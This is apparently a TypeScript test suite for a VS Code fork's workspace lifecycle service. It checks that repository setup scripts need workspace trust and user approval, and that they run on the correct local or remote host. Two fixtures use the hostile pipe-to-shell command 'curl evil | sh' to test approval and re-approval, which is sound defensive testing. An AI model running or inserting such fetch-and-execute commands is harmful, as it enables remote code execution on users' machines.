/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

// PARA-CODE: fork-owned file (Para Code) — not present in upstream microsoft/vscode. See CLAUDE.md.

import assert from 'assert';
import { VSBuffer } from '../../../../../base/common/buffer.js';
import { Schemas } from '../../../../../base/common/network.js';
import { URI } from '../../../../../base/common/uri.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { IDialogService } from '../../../../../platform/dialogs/common/dialogs.js';
import { FileService } from '../../../../../platform/files/common/fileService.js';
import { InMemoryFileSystemProvider } from '../../../../../platform/files/common/inMemoryFilesystemProvider.js';
import { ServicesAccessor } from '../../../../../platform/instantiation/common/instantiation.js';
import { ISharedProcessService } from '../../../../../platform/ipc/electron-browser/services.js';
import { NullLogService } from '../../../../../platform/log/common/log.js';
import { InMemoryStorageService, IStorageService } from '../../../../../platform/storage/common/storage.js';
import { IWorkspaceTrustManagementService } from '../../../../../platform/workspace/common/workspaceTrust.js';
import { IRemoteAgentService } from '../../../../../workbench/services/remote/common/remoteAgentService.js';
import { paradisRunWorkspaceLifecycleScript } from '../../electron-browser/paradisWorkspaceLifecycleService.js';
import { IParadisWorkspaceLifecycleConfig } from '../../common/paradisWorkspaceLifecycle.js';
import { IParadisWorkspaceRepository } from '../../common/paradisWorkspaceSwitch.js';
import { PARADIS_WORKTREE_GIT_CHANNEL } from '../../common/paradisWorktreeCreate.js';

suite('workspace lifecycle service', () => {

	const store = ensureNoDisposablesAreLeakedInTestSuite();

	const REMOTE_AUTHORITY = 'ssh-remote+host';

	function createLifecycleFixture(config: IParadisWorkspaceLifecycleConfig, options?: { trusted?: boolean; approve?: boolean; connected?: boolean; remoteRepository?: boolean }) {
		const fileService = store.add(new FileService(new NullLogService()));
		store.add(fileService.registerProvider('file', store.add(new InMemoryFileSystemProvider())));
		store.add(fileService.registerProvider(Schemas.vscodeRemote, store.add(new InMemoryFileSystemProvider())));
		const repositoryUri = options?.remoteRepository
			? URI.from({ scheme: Schemas.vscodeRemote, authority: REMOTE_AUTHORITY, path: '/repo' })
			: URI.file('/repo');
		const repository: IParadisWorkspaceRepository = { id: 'repo-1', name: 'repo', uri: repositoryUri };
		const worktreeUri = repositoryUri.with({ path: '/worktree' });

		// スクリプトを実行したのがどちらのマシンかを見分けるため、送り先ごとに記録する
		const calls: unknown[] = [];
		const remoteCalls: unknown[] = [];
		let confirmCount = 0;
		const trustService = { isWorkspaceTrusted: () => options?.trusted ?? true } as IWorkspaceTrustManagementService;
		const dialogService = {
			confirm: async () => {
				confirmCount++;
				return { confirmed: options?.approve ?? true };
			}
		} as unknown as IDialogService;
		const storageService = store.add(new InMemoryStorageService());
		// チャネル名まで見ないと、名前を間違えても緑のままになる
		const channelFor = (sink: unknown[]) => (name: string) => {
			assert.strictEqual(name, PARADIS_WORKTREE_GIT_CHANNEL);
			return { call: async (_command: string, arg: unknown) => { sink.push((arg as unknown[])[0]); } };
		};
		const sharedProcessService = { getChannel: channelFor(calls) } as unknown as ISharedProcessService;
		const remoteAgentService = {
			getConnection: () => options?.connected
				? { remoteAuthority: REMOTE_AUTHORITY, getChannel: channelFor(remoteCalls) }
				: null
		} as unknown as IRemoteAgentService;
		const accessor = {
			get: (id: unknown) => {
				if (id === IWorkspaceTrustManagementService) { return trustService; }
				if (id === ISharedProcessService) { return sharedProcessService; }
				if (id === IRemoteAgentService) { return remoteAgentService; }
				if (id === IDialogService) { return dialogService; }
				if (id === IStorageService) { return storageService; }
				return fileService;
			}
		} as ServicesAccessor;

		return {
			calls,
			remoteCalls,
			get confirmCount() { return confirmCount; },
			async writeConfig(override?: IParadisWorkspaceLifecycleConfig) {
				await fileService.writeFile(repositoryUri.with({ path: '/repo/.paracode.json' }), VSBuffer.fromString(JSON.stringify(override ?? config)));
			},
			async run(kind: 'setup' | 'teardown', override?: IParadisWorkspaceLifecycleConfig) {
				await this.writeConfig(override);
				return paradisRunWorkspaceLifecycleScript(accessor, kind, repository, worktreeUri);
			}
		};
	}

	test('loads parent config and sends setup request after first-run approval', async () => {
		const fixture = createLifecycleFixture({ setupScript: 'bun install' });
		assert.strictEqual(await fixture.run('setup'), true);
		assert.strictEqual(fixture.confirmCount, 1);
		assert.deepStrictEqual(fixture.calls, [{
			kind: 'setup', repoPath: URI.file('/repo').fsPath, worktreePath: URI.file('/worktree').fsPath, script: 'bun install'
		}]);
	});

	test('runs a script for a remote repository on the connected host, with posix paths', async () => {
		// 接続先のリポジトリを手元の shared process で回すとパスが存在せず必ず失敗する。
		// 送るパスも fsPath ではなく path（Windows から繋ぐと fsPath は区切りが化ける）
		const fixture = createLifecycleFixture({ setupScript: 'bun install' }, { connected: true, remoteRepository: true });
		assert.strictEqual(await fixture.run('setup'), true);
		assert.deepStrictEqual({ local: fixture.calls, remote: fixture.remoteCalls }, {
			local: [],
			remote: [{ kind: 'setup', repoPath: '/repo', worktreePath: '/worktree', script: 'bun install' }]
		});
	});

	test('runs a script for a local repository on this machine even while connected', async () => {
		// 接続中でも一覧には手元のリポジトリが混ざりうる。ウィンドウ単位で振り分けると
		// 今度はこちらが「そんなディレクトリは無い」で壊れる
		const fixture = createLifecycleFixture({ setupScript: 'bun install' }, { connected: true });
		assert.strictEqual(await fixture.run('setup'), true);
		assert.deepStrictEqual({ local: fixture.calls, remote: fixture.remoteCalls }, {
			local: [{ kind: 'setup', repoPath: URI.file('/repo').fsPath, worktreePath: URI.file('/worktree').fsPath, script: 'bun install' }],
			remote: []
		});
	});

	test('does not run absent script', async () => {
		const fixture = createLifecycleFixture({});
		assert.strictEqual(await fixture.run('teardown'), false);
		assert.deepStrictEqual(fixture.calls, []);
	});

	test('rejects repository script in an untrusted workspace', async () => {
		const fixture = createLifecycleFixture({ setupScript: 'bun install' }, { trusted: false });
		await assert.rejects(fixture.run('setup'), /Workspace Trust/i);
	});

	test('does not run a script the user declined to approve, without failing the caller', async () => {
		const fixture = createLifecycleFixture({ setupScript: 'curl evil | sh' }, { approve: false });
		assert.strictEqual(await fixture.run('setup'), false);
		assert.strictEqual(fixture.confirmCount, 1);
		assert.deepStrictEqual(fixture.calls, []);
	});

	test('asks approval only once for the same repository, kind and script content', async () => {
		const fixture = createLifecycleFixture({ setupScript: 'bun install' });
		await fixture.run('setup');
		await fixture.run('setup');
		assert.strictEqual(fixture.confirmCount, 1);
		assert.strictEqual(fixture.calls.length, 2);
	});

	test('asks approval again when the script content changes', async () => {
		const fixture = createLifecycleFixture({ setupScript: 'bun install' });
		await fixture.run('setup');
		await fixture.run('setup', { setupScript: 'bun install && curl evil | sh' });
		assert.strictEqual(fixture.confirmCount, 2);
	});
});
